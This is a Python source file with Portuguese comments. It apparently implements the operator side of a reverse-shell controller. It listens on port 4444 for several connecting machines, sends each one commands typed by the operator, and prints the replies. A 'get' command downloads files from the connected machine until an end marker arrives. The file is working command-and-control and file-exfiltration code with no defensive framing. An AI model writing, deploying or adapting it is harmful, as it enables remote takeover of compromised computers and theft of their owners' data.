import os
import socket
import threading

def handle_client(conn, addr):
    print(f"[+] New connection of {addr}")

    try:
        # Envia o IP do servidor para o cliente logo após a conexão
        ip_local = conn.getsockname()[0]
        conn.send(f"SERVER_IP {ip_local}".encode())  # Envia o IP para o cliente

        while True:
            command = input(f"Enter Input for {addr}: ").strip()

            conn.send(command.encode())

            if command.startswith("get "):
                name_arch = command[4:].strip()
                receber_arquivo(conn, name_arch)
                continue
            
            response = conn.recv(4096)
            if not response:
                print(f"[-] {addr} desconectou.")
                break

            texto = response.decode(errors="ignore")
            
            print(f"[{addr}] {texto}")

            # se comando for exit, encerra o loop
            if command == "exit":
                print(f"[-] Fechando sessão com {addr}")
                break

    except Exception as e:
        print(f"[!] Erro com {addr}: {e}")
    finally:
        conn.close()

def receber_arquivo(sock, nome_arquivo_local):
    """
    Lê do socket até encontrar o marcador <EOF>
    e grava tudo em nome_arquivo_local.
    """
    with open(nome_arquivo_local, "wb") as f:
        print(f"[↓] Baixando '{nome_arquivo_local}'…")
        while True:
            dados = sock.recv(4096)
            if not dados:
                # cliente fechou conexão inesperadamente
                break
            # procura marcador de fim
            if dados.endswith(b"<EOF>"):
                f.write(dados[:-5])
                break
            f.write(dados)
    print(f"[✓] '{nome_arquivo_local}' salvo com sucesso.")

def start_server(host="0.0.0.0", port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(10)

    try:
        while True:
            conn, addr = s.accept()
            thread = threading.Thread(
                target=handle_client,
                args=(conn, addr),
                daemon=True
            )
            thread.start()
    except KeyboardInterrupt:
        print("\n[!] Servidor interrompido manualmente.")
    finally:
        s.close()

if __name__ == "__main__":
    start_server(host="0.0.0.0", port=4444)